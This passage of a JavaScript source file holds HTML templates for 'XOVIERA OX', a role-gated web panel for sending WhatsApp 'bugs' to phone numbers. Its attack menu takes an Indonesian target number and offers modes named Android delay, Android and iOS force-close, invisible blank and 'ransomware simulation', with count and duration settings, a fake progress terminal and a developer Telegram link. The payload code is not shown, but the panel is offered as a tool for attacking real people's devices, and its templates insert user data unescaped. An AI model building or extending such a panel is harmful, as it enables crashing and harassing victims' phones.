      border-radius: 50%;
      display: inline-block;
      box-shadow: 0 0 10px var(--success);
    }
    
    .message {
      background: rgba(20, 20, 40, 0.7);
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
      border-left: 5px solid var(--primary);
      text-align: center;
    }
    
    .footer {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 10px;
      margin-top: 20px;
    }
    
    .footer-btn {
      background: rgba(0, 240, 255, 0.1);
      border: 1px solid var(--primary);
      border-radius: 8px;
      padding: 10px 15px;
      font-size: 14px;
      color: var(--text);
      display: flex;
      align-items: center;
      gap: 8px;
      transition: all 0.3s ease;
      text-decoration: none;
      cursor: pointer;
    }
    
    .footer-btn:hover {
      background: rgba(0, 240, 255, 0.2);
      transform: translateY(-2px);
    }
    
    .footer-btn i {
      font-size: 16px;
    }
    
    .user-info {
      width: 100%;
      text-align: center;
      font-size: 12px;
      color: var(--primary);
      margin-top: 15px;
      display: flex;
      flex-direction: column;
      gap: 5px;
    }
    
    .user-info span {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 5px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <img src="https://files.catbox.moe/b47zem.jpg" alt="XOVIERA OX" class="logo">
    </div>
    
    ${isLoggedIn ? `
    <div class="username">
      ${username}
      <span class="role-badge ${role}-badge">${role}</span>
    </div>
    <div class="status">CONNECTED TO XOVIERA OX NETWORK</div>
    
    ${message ? `<div class="message">${message}</div>` : ''}
    
    <div class="footer">
      <a href="https://t.me/Zyre_Nsha" class="footer-btn" target="_blank">
        <i class="fab fa-telegram"></i> Developer
      </a>
      <a href="/logout" class="footer-btn">
        <i class="fas fa-sign-out-alt"></i> Logout
      </a>
    </div>
    ` : `
    <div class="username">XOVIERA OX</div>
    <div class="status">POWERED BY ZYRENSHA DEVELOPER</div>
    
    <div class="footer">
      <a href="https://t.me/Zyre_Nsha" class="footer-btn" target="_blank">
        <i class="fab fa-telegram"></i> Developer
      </a>
      <a href="#" id="loginBtn" class="footer-btn">
        <i class="fas fa-sign-in-alt"></i> Login
      </a>
    </div>
    `}
  </div>

  ${loginFormHTML()}

  <script>
    // Show/hide login form
    const loginBtn = document.getElementById('loginBtn');
    const loginFormContainer = document.getElementById('loginFormContainer');
    const closeLogin = document.getElementById('closeLogin');
    
    if (loginBtn) {
      loginBtn.addEventListener('click', (e) => {
        e.preventDefault();
        loginFormContainer.style.display = 'flex';
      });
    }
    
    if (closeLogin) {
      closeLogin.addEventListener('click', () => {
        loginFormContainer.style.display = 'none';
      });
    }
    
    // Close login form when clicking outside
    loginFormContainer.addEventListener('click', (e) => {
      if (e.target === loginFormContainer) {
        loginFormContainer.style.display = 'none';
      }
    });
  </script>
</body>
</html>
`;

// Execution page HTML
const executionPageHTML = (userInfo, mode = '', target = '', message = '') => {
  const { username, role, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>XOVIERA OX | ATTACK MENU</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    :root {
      --primary: #00f0ff;
      --secondary: #0033ff;
      --accent: #ff00e6;
      --text: #e6e6fa;
      --dark: #0a0a1a;
      --light: #f8f8ff;
      --success: #00ff7f;
      --danger: #ff4444;
      --warning: #ffaa00;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Montserrat', sans-serif;
    }
    
    body {
      background: linear-gradient(135deg, var(--dark), #000033);
      background-size: 400% 400%;
      animation: gradientBG 15s ease infinite;
      color: var(--text);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      position: relative;
      overflow-x: hidden;
    }
    
    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    
    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        radial-gradient(circle at 20% 30%, rgba(0, 240, 255, 0.1) 0%, transparent 20%),
        radial-gradient(circle at 80% 70%, rgba(255, 0, 230, 0.1) 0%, transparent 20%),
        linear-gradient(to bottom, transparent 90%, rgba(0, 240, 255, 0.1) 100%);
      z-index: -1;
    }
    
    .container {
      background: rgba(10, 10, 26, 0.8);
      border: 1px solid var(--primary);
      padding: 30px;
      border-radius: 15px;
      max-width: 500px;
      width: 100%;
      box-shadow: 
        0 0 20px rgba(0, 240, 255, 0.5),
        0 0 40px rgba(0, 51, 255, 0.3);
      backdrop-filter: blur(10px);
      position: relative;
      overflow: hidden;
      transition: all 0.3s ease;
    }
    
    .container::after {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: linear-gradient(
        to bottom right,
        transparent 45%,
        rgba(0, 240, 255, 0.1) 50%,
        transparent 55%
      );
      animation: shine 3s infinite;
      z-index: -1;
    }
    
    .logo-container {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
      position: relative;
    }
    
    .logo {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      object-fit: cover;
      border: 3px solid var(--primary);
      box-shadow: 0 0 30px rgba(0, 240, 255, 0.7);
      transition: all 0.3s ease;
    }
    
    .logo:hover {
      transform: scale(1.05);
      box-shadow: 0 0 40px rgba(0, 240, 255, 0.9);
    }
    
    .status-badge {
      position: absolute;
      top: 0;
      right: 25%;
      background: var(--success);
      color: var(--dark);
      padding: 5px 10px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: bold;
      box-shadow: 0 0 10px rgba(0, 255, 127, 0.5);
      animation: pulse 2s infinite;
    }
    
    @keyframes pulse {
      0% { box-shadow: 0 0 0 0 rgba(0, 255, 127, 0.7); }
      70% { box-shadow: 0 0 0 10px rgba(0, 255, 127, 0); }
      100% { box-shadow: 0 0 0 0 rgba(0, 255, 127, 0); }
    }
    
    .username {
      font-size: 24px;
      color: var(--primary);
      font-weight: bold;
      text-align: center;
      margin-bottom: 5px;
      font-family: 'Orbitron', sans-serif;
      text-shadow: 0 0 10px rgba(0, 240, 255, 0.7);
      letter-spacing: 1px;
    }
    
    .role-badge {
      display: inline-block;
      padding: 3px 8px;
      border-radius: 4px;
      font-size: 12px;
      font-weight: bold;
      margin-left: 8px;
      text-transform: uppercase;
    }
    
    .owner-badge {
      background: linear-gradient(to right, #ff00e6, #ff4444);
    }
    
    .admin-badge {
      background: linear-gradient(to right, #ffaa00, #ff4444);
    }
    
    .moderator-badge {
      background: linear-gradient(to right, #00f0ff, #0033ff);
    }
    
    .helper-badge {
      background: linear-gradient(to right, #00ff7f, #00f0ff);
    }
    
    .premium-badge {
      background: linear-gradient(to right, #ff00e6, #0033ff);
    }
    
    .vip-badge {
      background: linear-gradient(to right, #ffaa00, #ff00e6);
    }
    
    .exclusive-badge {
      background: linear-gradient(to right, #00ff7f, #ffaa00);
    }
    
    .status {
      font-size: 14px;
      color: var(--success);
      margin-bottom: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
    }
    
    .status::before {
      content: '';
      width: 10px;
      height: 10px;
      background: var(--success);
      border-radius: 50%;
      display: inline-block;
      box-shadow: 0 0 10px var(--success);
    }
    
    .input-group {
      position: relative;
      margin-bottom: 20px;
    }
    
    .input-group input {
      width: 100%;
      padding: 15px 15px 15px 45px;
      border-radius: 8px;
      background: rgba(20, 20, 40, 0.7);
      border: 1px solid var(--primary);
      color: var(--text);
      font-size: 16px;
      transition: all 0.3s ease;
    }
    
    .input-group input:focus {
      outline: none;
      border-color: var(--accent);
      box-shadow: 0 0 15px rgba(255, 0, 230, 0.5);
    }
    
    .input-group i {
      position: absolute;
      left: 15px;
      top: 50%;
      transform: translateY(-50%);
      color: var(--primary);
    }
    
    .mode-selector {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
      margin-bottom: 20px;
    }
    
    .mode-btn {
      padding: 15px;
      border: none;
      border-radius: 8px;
      background: rgba(20, 20, 40, 0.7);
      color: var(--text);
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease;
      text-align: left;
      display: flex;
      align-items: center;
      gap: 10px;
      border-left: 5px solid var(--primary);
      position: relative;
    }
    
    .mode-btn:hover {
      background: rgba(0, 240, 255, 0.2);
      transform: translateX(5px);
    }
    
    .mode-btn.selected {
      background: var(--primary);
      color: var(--dark);
      box-shadow: 0 0 20px rgba(0, 240, 255, 0.7);
    }
    
    .mode-btn i {
      font-size: 20px;
    }
    
    .mode-tooltip {
      position: absolute;
      bottom: 100%;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(0, 0, 0, 0.8);
      color: white;
      padding: 8px 12px;
      border-radius: 6px;
      font-size: 12px;
      width: 200px;
      text-align: center;
      opacity: 0;
      visibility: hidden;
      transition: all 0.3s ease;
      z-index: 10;
      pointer-events: none;
    }
    
    .mode-btn:hover .mode-tooltip {
      opacity: 1;
      visibility: visible;
      transform: translateX(-50%) translateY(-5px);
    }
    
    .attack-options {
      display: none;
      margin-bottom: 20px;
      background: rgba(20, 20, 40, 0.7);
      padding: 15px;
      border-radius: 8px;
      border-left: 5px solid var(--accent);
    }
    
    .option-title {
      font-size: 14px;
      color: var(--primary);
      margin-bottom: 10px;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    
    .option-radio {
      display: flex;
      gap: 15px;
      margin-bottom: 15px;
    }
    
    .radio-group {
      display: flex;
      align-items: center;
      gap: 8px;
    }
    
    .radio-group input[type="radio"] {
      appearance: none;
      width: 16px;
      height: 16px;
      border: 2px solid var(--primary);
      border-radius: 50%;
      position: relative;
      cursor: pointer;
    }
    
    .radio-group input[type="radio"]:checked::before {
      content: '';
      position: absolute;
      width: 8px;
      height: 8px;
      background: var(--primary);
      border-radius: 50%;
      top: 2px;
      left: 2px;
    }
    
    .radio-group label {
      cursor: pointer;
      font-size: 14px;
    }
    
    .option-input {
      display: none;
      margin-bottom: 15px;
    }
    
    .option-input input {
      width: 100%;
      padding: 10px 15px;
      border-radius: 6px;
      background: rgba(30, 30, 50, 0.7);
      border: 1px solid var(--primary);
      color: var(--text);
      font-size: 14px;
    }
    
    .option-select {
      display: none;
      margin-bottom: 15px;
    }
    
    .option-select select {
      width: 100%;
      padding: 10px 15px;
      border-radius: 6px;
      background: rgba(30, 30, 50, 0.7);
      border: 1px solid var(--primary);
      color: var(--text);
      font-size: 14px;
      cursor: pointer;
    }
    
    .execute-button {
      background: linear-gradient(to right, var(--primary), var(--secondary));
      color: var(--dark);
      padding: 15px;
      width: 100%;
      border-radius: 8px;
      font-weight: bold;
      border: none;
      margin-bottom: 20px;
      cursor: pointer;
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
      font-family: 'Orbitron', sans-serif;
      letter-spacing: 1px;
      text-transform: uppercase;
    }
    
    .execute-button:disabled {
      background: #333;
      cursor: not-allowed;
      opacity: 0.7;
    }
    
    .execute-button:not(:disabled):hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 20px rgba(0, 240, 255, 0.4);
    }
    
    .execute-button:not(:disabled):active {
      transform: translateY(1px);
    }
    
    .execute-button::after {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: linear-gradient(
        to bottom right,
        transparent 45%,
        rgba(255, 255, 255, 0.3) 50%,
        transparent 55%
      );
      animation: shine 3s infinite;
      z-index: 0;
    }
    
    .progress-container {
      width: 100%;
      height: 8px;
      background: rgba(20, 20, 40, 0.7);
      border-radius: 4px;
      margin-bottom: 20px;
      overflow: hidden;
      display: none;
      position: relative;
    }
    
    .progress-bar {
      height: 100%;
      width: 0%;
      background: linear-gradient(to right, var(--primary), var(--accent));
      border-radius: 4px;
      transition: width 0.3s ease;
      position: relative;
      overflow: hidden;
    }
    
    .progress-bar::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(
        90deg,
        transparent,
        rgba(255, 255, 255, 0.3),
        transparent
      );
      animation: progressShine 2s infinite;
    }
    
    @keyframes progressShine {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(100%); }
    }
    
    .attack-status {
      display: none;
      text-align: center;
      margin-bottom: 20px;
      font-family: 'Orbitron', sans-serif;
      color: var(--primary);
      text-shadow: 0 0 10px rgba(0, 240, 255, 0.7);
    }
    
    .attack-animation {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }
    
    .attack-animation i {
      font-size: 40px;
      color: var(--danger);
      animation: pulse 1.5s infinite;
    }
    
    .footer {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 10px;
      margin-top: 20px;
    }
    
    .footer-btn {
      background: rgba(0, 240, 255, 0.1);
      border: 1px solid var(--primary);
      border-radius: 8px;
      padding: 10px 15px;
      font-size: 14px;
      color: var(--text);
      display: flex;
      align-items: center;
      gap: 8px;
      transition: all 0.3s ease;
      text-decoration: none;
    }
    
    .footer-btn:hover {
      background: rgba(0, 240, 255, 0.2);
      transform: translateY(-2px);
    }
    
    .footer-btn i {
      font-size: 16px;
    }
    
    .user-info {
      width: 100%;
      text-align: center;
      font-size: 12px;
      color: var(--primary);
      margin-top: 15px;
      display: flex;
      flex-direction: column;
      gap: 5px;
    }
    
    .user-info span {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 5px;
    }
    
    /* Terminal effect for status */
    .terminal {
      background: rgba(0, 0, 0, 0.5);
      border: 1px solid var(--primary);
      border-radius: 5px;
      padding: 10px;
      margin-bottom: 20px;
      font-family: monospace;
      color: var(--success);
      text-shadow: 0 0 5px rgba(0, 255, 127, 0.5);
      max-height: 150px;
      overflow-y: auto;
    }
    
    .terminal-line {
      animation: terminalTyping 2s steps(40, end);
      white-space: nowrap;
      overflow: hidden;
      border-right: 2px solid var(--primary);
    }
    
    @keyframes terminalTyping {
      from { width: 0 }
      to { width: 100% }
    }
    
    /* Responsive adjustments */
    @media (max-width: 768px) {
      .container {
        padding: 20px;
      }
      
      .logo {
        width: 80px;
        height: 80px;
      }
      
      .username {
        font-size: 20px;
      }
      
      .mode-selector {
        grid-template-columns: 1fr;
      }
    }
    
    @media (max-width: 480px) {
      body {
        padding: 10px;
      }
      
      .container {
        padding: 15px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="-container">
      <img src="https://files.catbox.moe/b47zem.jpg" alt="XOVIERA OX" class="logo">
      <div class="status-badge">ONLINE</div>
    </div>
    
    <div class="username">
      ${username}
      <span class="role-badge ${role}-badge">${role}</span>
    </div>
    <div class="status">CONNECTED TO XOVIERA OX NETWORK</div>

    ${message ? `<div class="terminal"><div class="terminal-line">${message}</div></div>` : ''}

    <div class="input-group">
      <i class="fas fa-mobile-alt"></i>
      <input type="text" id="targetInput" placeholder="62xxxxxxxxxx" autocomplete="off" value="${target || ''}">
    </div>

    <div class="progress-container" id="progressContainer">
      <div class="progress-bar" id="progressBar"></div>
    </div>

    <div class="attack-status" id="attackStatus">
      <div class="attack-animation">
        <i class="fas fa-bolt"></i>
      </div>
      <div class="terminal" id="terminal">
        <div class="terminal-line">Initializing attack sequence...</div>
      </div>
    </div>

    <div class="mode-selector">
      <button class="mode-btn" data-mode="ph4ntom">
        <i class="fab fa-android"></i>
        <span>XOVIERA DELEY</span>
        <div class="mode-tooltip">Android Delay Attack - Requires: VIP</div>
      </button>
      <button class="mode-btn" data-mode="extr4vaz" ${hasPermission(role, ATTACK_REQUIREMENTS.extr4vaz) ? '' : 'disabled'}>
        <i class="fab fa-android"></i>
        <span>XOVIERA ANDRO</span>
        <div class="mode-tooltip">Android FC Attack - Requires: VIP</div>
      </button>
      <button class="mode-btn" data-mode="sl4yerz" ${hasPermission(role, ATTACK_REQUIREMENTS.sl4yerz) ? '' : 'disabled'}>
        <i class="fab fa-apple"></i>
        <span>XOVIERA IOS</span>
        <div class="mode-tooltip">iOS FC Attack - Requires: VIP</div>
      </button>
      <button class="mode-btn" data-mode="ex4ltedz" ${hasPermission(role, ATTACK_REQUIREMENTS.ex4ltedz) ? '' : 'disabled'}>
        <i class="fas fa-bomb"></i>
        <span>XOVIERA BLANK INVISIBLE</span>
        <div class="mode-tooltip">Advanced Attack - Requires: MODERATOR</div>
      </button>
      <button class="mode-btn" data-mode="w4nnacry" ${hasPermission(role, ATTACK_REQUIREMENTS.w4nnacry) ? '' : 'disabled'}>
        <i class="fas fa-skull"></i>
        <span>XOVIERA DELEY INVIS</span>
        <div class="mode-tooltip">Ransomware Simulation - Requires: HELPER</div>
      </button>
    </div>

    <div class="attack-options" id="attackOptions">
      <div class="option-title">
        <i class="fas fa-cog"></i> Attack Configuration
      </div>
      <div class="option-radio">
        <div class="radio-group">
          <input type="radio" id="countOption" name="attackType" value="count" checked>
          <label for="countOption">Count</label>
        </div>
        <div class="radio-group">
          <input type="radio" id="durationOption" name="attackType" value="duration">
          <label for="durationOption">Duration</label>
        </div>
      </div>
      <div class="option-input" id="countInput">
        <input type="number" id="attackCount" placeholder="Enter attack count (e.g. 15)" min="1" max="100">
      </div>
      <div class="option-select" id="durationSelect">
        <select id="durationUnit">
          <option value="minutes">Minutes</option>
          <option value="hours">Hours</option>
          <option value="days">Days</option>
        </select>
      </div>
      <div class="option-input" id="durationInput">
        <input type="number" id="attackDuration" placeholder="Enter duration (e.g. 5)" min="1" max="100">
      </div>
    </div>

    <button class="execute-button" id="executeBtn" disabled>
      <i class="fas fa-bolt"></i> SENDING BUG
    </button>

    <div class="footer">
      <a href="https://t.me/Zyre_Nsha" class="footer-btn" target="_blank">
        <i class="fab fa-telegram"></i> Developer
      </a>
      <a href="/logout" class="footer-btn">
        <i class="fas fa-sign-out-alt"></i> Logout
      </a>
      ${role === ROLES.OWNER ? '<a href="/dashboard" class="footer-btn"><i class="fas fa-tachometer-alt"></i> Dashboard</a>' : ''}
    </div>

    <div class="user-info">
      <span><i class="fas fa-user"></i> ${username}</span>
      <span><i class="fas fa-clock"></i> ${formattedTime}</span>
    </div>
  </div>

  <script>
    // Terminal-like logging
    function logToTerminal(message) {
      const terminal = document.getElementById('terminal');
      const line = document.createElement('div');
      line.className = 'terminal-line';
      line.textContent = '> ' + message;
      terminal.appendChild(line);
      terminal.scrollTop = terminal.scrollHeight;
    }
    
    // Mode selection
    const targetInput = document.getElementById('targetInput');
    const modeButtons = document.querySelectorAll('.mode-btn');
    const executeBtn = document.getElementById('executeBtn');
    const progressContainer = document.getElementById('progressContainer');
    const progressBar = document.getElementById('progressBar');
    const attackStatus = document.getElementById('attackStatus');
    const attackOptions = document.getElementById('attackOptions');
    const countInput = document.getElementById('countInput');
    const durationSelect = document.getElementById('durationSelect');
    const durationInput = document.getElementById('durationInput');
    const countOption = document.getElementById('countOption');
    const durationOption = document.getElementById('durationOption');
    
    let selectedMode = null;
    let attackType = 'count';
    
    // Validate phone number
    function isValidNumber(number) {
      const pattern = /^62\\d{9,13}$/;
      return pattern.test(number);
    }
    
    // Attack type selection
    countOption.addEventListener('change', function() {
      if (this.checked) {
        attackType = 'count';
        countInput.style.display = 'block';
        durationSelect.style.display = 'none';
        durationInput.style.display = 'none';
      }
    });
    
    durationOption.addEventListener('change', function() {
      if (this.checked) {
        attackType = 'duration';
        countInput.style.display = 'none';
        durationSelect.style.display = 'block';
        durationInput.style.display = 'block';
      }
    });
    
    // Mode selection
    modeButtons.forEach(button => {
      button.addEventListener('click', () => {
        if (button.disabled) {
          logToTerminal("You don't have permission to use this attack mode!");
          return;
        }
        
        modeButtons.forEach(btn => btn.classList.remove('selected'));
        button.classList.add('selected');
        selectedMode = button.getAttribute('data-mode');
        attackOptions.style.display = 'block';
        
        // Show count input by default
        attackType = 'count';
        countOption.checked = true;
        countInput.style.display = 'block';
        durationSelect.style.display = 'none';
        durationInput.style.display = 'none';
        
        if (isValidNumber(targetInput.value.trim())) {
          executeBtn.disabled = false;
        }
      });
    });
    
    // Input validation
    targetInput.addEventListener('input', () => {
      if (isValidNumber(targetInput.value.trim()) && selectedMode) {
        executeBtn.disabled = false;
      } else {
        executeBtn.disabled = true;
      }
    });
    
    // Execute attack
    executeBtn.addEventListener('click', () => {
      const number = targetInput.value.trim();
      
      if (!isValidNumber(number)) {
        logToTerminal("Invalid number format! Must start with 62 and be 10-15 digits long.");
        return;
      }
      
      if (!selectedMode) {
        logToTerminal("Please select an attack mode first!");
        return;
      }
      
      let attackParams = '';
      if (attackType === 'count') {
        const count = document.getElementById('attackCount').value;
        if (!count || count < 1 || count > 100) {
          logToTerminal("Please enter a valid count (1-100)");
          return;
        }
        attackParams = \`count=\${count}\`;
      } else {
        const duration = document.getElementById('attackDuration').value;
        if (!duration || duration < 1 || duration > 100) {
          logToTerminal("Please enter a valid duration (1-100)");
          return;
        }
        const unit = document.getElementById('durationUnit').value;
        attackParams = \`duration=\${duration}&unit=\${unit}\`;
      }
      
      // Show loading animation
      executeBtn.disabled = true;
      executeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING';
      progressContainer.style.display = 'block';
      attackStatus.style.display = 'block';
      
      // Clear terminal
      document.getElementById('terminal').innerHTML = '';
      logToTerminal("Initializing attack sequence...");
      logToTerminal("Target: " + number);
      logToTerminal("Mode: " + selectedMode.toUpperCase());
      logToTerminal("Type: " + attackType.toUpperCase());
      
      // Animate progress bar with terminal updates
      let progress = 0;
      const interval = setInterval(() => {
        progress += 2;
        progressBar.style.width = progress + '%';
        
        if (progress <= 20) {
          logToTerminal("Establishing connection to XOVIERA OX network...");
        } else if (progress <= 40) {
          logToTerminal("Authenticating with target device...");
        } else if (progress <= 60) {
          logToTerminal("Preparing payload for " + selectedMode.toUpperCase() + " attack...");
        } else if (progress <= 80) {
          logToTerminal("Deploying attack vectors...");
        } else if (progress < 100) {
          logToTerminal("Finalizing attack sequence...");
        }
        
        if (progress >= 100) {
          clearInterval(interval);
          logToTerminal("Attack sequence completed successfully!");
          setTimeout(() => {
            window.location.href = '/execution?mode=' + selectedMode + '&target=' + number + '&' + attackParams;
          }, 1000);
        }
      }, 100);
    });
    
    // Focus input when page loads
    setTimeout(() => {
      targetInput.focus();
    }, 500);
  </script>
</body>
</html>`;
};

// Owner dashboard HTML
const ownerDashboardHTML = (users, activeSenders = [], currentUserRole = ROLES.OWNER) => {
  const canManageUsers = hasManagementPermission(currentUserRole, 'userManagement');
  const canManageSenders = hasManagementPermission(currentUserRole, 'senderManagement');
  
  return `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>XOVIERA OX | Owner Dashboard</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    :root {
      --primary: #00f0ff;
      --secondary: #0033ff;
      --accent: #ff00e6;
      --text: #e6e6fa;
      --dark: #0a0a1a;
      --light: #f8f8ff;
      --success: #00ff7f;
      --danger: #ff4444;
      --warning: #ffaa00;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Montserrat', sans-serif;
    }
    
    body {
      background: linear-gradient(135deg, var(--dark), #000033);
      background-size: 400% 400%;
      animation: gradientBG 15s ease infinite;
      color: var(--text);
      min-height: 100vh;
      padding: 20px;
      position: relative;
      overflow-x: hidden;
    }
    
    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    
    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        radial-gradient(circle at 20% 30%, rgba(0, 240, 255, 0.1) 0%, transparent 20%),
        radial-gradient(circle at 80% 70%, rgba(255, 0, 230, 0.1) 0%, transparent 20%),
        linear-gradient(to bottom, transparent 90%, rgba(0, 240, 255, 0.1) 100%);
      z-index: -1;
    }
    
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 30px;
    }
    
    .logo-container {
      display: flex;
      align-items: center;
      gap: 15px;
    }
    
    .logo {
      width: 60px;
      height: 60px;
      border-radius: 50%;
      object-fit: cover;
      border: 2px solid var(--primary);
      box-shadow: 0 0 20px rgba(0, 240, 255, 0.7);
    }
    
    .title {
      font-family: 'Orbitron', sans-serif;
      color: var(--primary);
      text-shadow: 0 0 10px rgba(0, 240, 255, 0.7);
      letter-spacing: 1px;
    }
    
    .nav-buttons {
      display: flex;
      gap: 10px;
    }
    
    .nav-btn {
      background: rgba(0, 240, 255, 0.1);
      border: 1px solid var(--primary);
      border-radius: 8px;
      padding: 10px 15px;
      font-size: 14px;
      color: var(--text);
      display: flex;
      align-items: center;
      gap: 8px;
      transition: all 0.3s ease;
      text-decoration: none;
    }
    
    .nav-btn:hover {
      background: rgba(0, 240, 255, 0.2);
      transform: translateY(-2px);
    }
    
    .dashboard-container {
      background: rgba(10, 10, 26, 0.8);
      border: 1px solid var(--primary);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 
        0 0 20px rgba(0, 240, 255, 0.5),
        0 0 40px rgba(0, 51, 255, 0.3);
      backdrop-filter: blur(10px);
      margin-bottom: 30px;
    }
    
    .section-title {
      font-family: 'Orbitron', sans-serif;
      color: var(--primary);
      margin-bottom: 20px;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    
    .section-title i {
      font-size: 20px;
    }
    
    .tab-buttons {
      display: flex;
      gap: 10px;
      margin-bottom: 20px;
      border-bottom: 1px solid rgba(0, 240, 255, 0.2);
      padding-bottom: 10px;
    }
    
    .tab-btn {
      background: rgba(0, 240, 255, 0.1);
      border: none;
      border-radius: 6px;
      padding: 8px 15px;
      font-size: 14px;
      color: var(--text);
      cursor: pointer;
      transition: all 0.3s ease;
    }
    
    .tab-btn.active {
      background: var(--primary);
      color: var(--dark);
      font-weight: bold;
    }
    
    .tab-btn:hover:not(.active) {
      background: rgba(0, 240, 255, 0.2);
    }
    
    .tab-content {
      display: none;
    }
    
    .tab-content.active {
      display: block;
    }
    
    /* User Management Tab */
    .add-key-form {
      display: grid;
      grid-template-columns: 1fr 1fr 1fr 1fr;
      gap: 15px;
      margin-bottom: 30px;
    }
    
    .form-group {
      display: flex;
      flex-direction: column;
      gap: 5px;
    }
    
    .form-group label {
      font-size: 14px;
      color: var(--primary);
    }
    
    .form-group input, .form-group select {
      padding: 10px 15px;
      border-radius: 6px;
      background: rgba(20, 20, 40, 0.7);
      border: 1px solid var(--primary);
      color: var(--text);
      font-size: 14px;
    }
    
    .form-group input:focus, .form-group select:focus {
      outline: none;
      border-color: var(--accent);
      box-shadow: 0 0 15px rgba(255, 0, 230, 0.5);
    }
    
    .form-submit {
      background: linear-gradient(to right, var(--primary), var(--secondary));
      color: var(--dark);
      padding: 12px;
      border-radius: 8px;
      font-weight: bold;
      border: none;
      cursor: pointer;
      transition: all 0.3s ease;
      font-family: 'Orbitron', sans-serif;
      letter-spacing: 1px;
      text-transform: uppercase;
      grid-column: 1 / -1;
    }
    
    .form-submit:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 20px rgba(0, 240, 255, 0.4);
    }
    
    .users-table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
    }
    
    .users-table th {
      background: rgba(0, 240, 255, 0.1);
      padding: 12px 15px;
      text-align: left;
      font-family: 'Orbitron', sans-serif;
      letter-spacing: 1px;
      border-bottom: 2px solid var(--primary);
    }
    
    .users-table td {
      padding: 12px 15px;
      border-bottom: 1px solid rgba(0, 240, 255, 0.1);
    }
    
    .users-table tr:hover {
      background: rgba(0, 240, 255, 0.05);
    }
    
    .role-badge {
      display: inline-block;
      padding: 3px 8px;
      border-radius: 4px;
      font-size: 12px;
      font-weight: bold;
      text-transform: uppercase;
    }
    
    .owner-badge {
      background: linear-gradient(to right, #ff00e6, #ff4444);
    }
    
    .admin-badge {
      background: linear-gradient(to right, #ffaa00, #ff4444);
    }
    
    .moderator-badge {
      background: linear-gradient(to right, #00f0ff, #0033ff);
    }
    
    .helper-badge {
      background: linear-gradient(to right, #00ff7f, #00f0ff);
    }
    
    .premium-badge {
      background: linear-gradient(to right, #ff00e6, #0033ff);
    }
    
    .vip-badge {
      background: linear-gradient(to right, #ffaa00, #ff00e6);
    }
    
    .exclusive-badge {
      background: linear-gradient(to right, #00ff7f, #ffaa00);
    }
    
    .action-btn {
      background: none;
      border: none;
      color: var(--primary);
      cursor: pointer;
      margin: 0 5px;
      font-size: 14px;
      transition: all 0.2s ease;
    }
    
    .action-btn:hover {
      color: var(--accent);
      transform: scale(1.1);
    }
    
    .delete-btn {
      color: var(--danger);
    }
    
    .edit-btn {
      color: var(--warning);
    }
    
    .extend-btn {
      color: var(--success);
    }
    
    .edit-form {
      display: none;
      background: rgba(20, 20, 40, 0.9);
      padding: 15px;
      border-radius: 8px;
      margin-top: 10px;
      border-left: 3px solid var(--warning);
    }
    
    .edit-form-grid {
      display: grid;
      grid-template-columns: 1fr 1fr 1fr;
      gap: 10px;
    }
    
    .edit-form-buttons {
      display: flex;
      justify-content: flex-end;
      gap: 10px;
      margin-top: 10px;
    }
    
    .edit-form-btn {
      padding: 8px 15px;
      border-radius: 6px;
      font-weight: bold;
      border: none;
      cursor: pointer;
    }
    
    .save-btn {
